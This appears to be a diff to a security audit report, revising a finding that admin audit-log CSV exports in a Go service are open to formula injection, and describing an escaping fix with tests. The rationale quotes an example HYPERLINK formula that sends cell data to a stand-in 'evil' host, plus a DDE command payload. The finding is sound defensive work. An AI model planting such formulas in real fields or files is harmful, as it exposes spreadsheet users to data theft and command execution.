@@ -80,21 +80,23 @@ the user split). Session store: its own role and database
 ### P4-2 — LOW — CSV exports are formula-injectable
 
 **Where.** `internal/handler/admin_logs_handler.go:157-168`
-(`ExportLogs`: `AdminEmail`, `TargetName` written verbatim) and
-`internal/handler/monitoring_handler.go` `writeReportCSV` (security-report
-CSV: emails, user agents, reasons — all attacker-influenced strings).
+(`ExportLogs`: `AdminEmail`, `Action`, `TargetType`, `TargetName`,
+`IPAddress` written verbatim). The security-report CSV
+(`monitoring_handler.go` `writeReportCSV`) was checked too and carries only
+numeric aggregates and dates — not affected, but it should use the same
+helper the day a free-text column is added.
 
 **Why.** A user registers with the email `=HYPERLINK("https://evil/?"&A1,"x")`
 or an app is named `=cmd|'/C …'!A0`; an admin exports the audit log or a
 security report and opens it in Excel/LibreOffice, which evaluates the cell.
 Classic DDE/formula injection; the SOC console is the most likely victim.
 
-**Verified.** Both writers use `encoding/csv` with no prefix escaping;
+**Verified.** `ExportLogs` uses `encoding/csv` with no prefix escaping;
 `csv.Writer` quotes commas/quotes only.
 
 **Fix (S).** One helper: if a field starts with `=`, `+`, `-`, `@`, `\t`,
-`\r`, prefix with `'` (or a leading space) before `cw.Write`. Apply to every
-string column in both writers; add a test with `=1+1`.
+`\r` (after trimming leading whitespace), prefix with `'` before
+`cw.Write`. Applied to every string column of `ExportLogs`, with tests.
 
 ### P4-3 — LOW — no request-body size limit on the JSON API
 
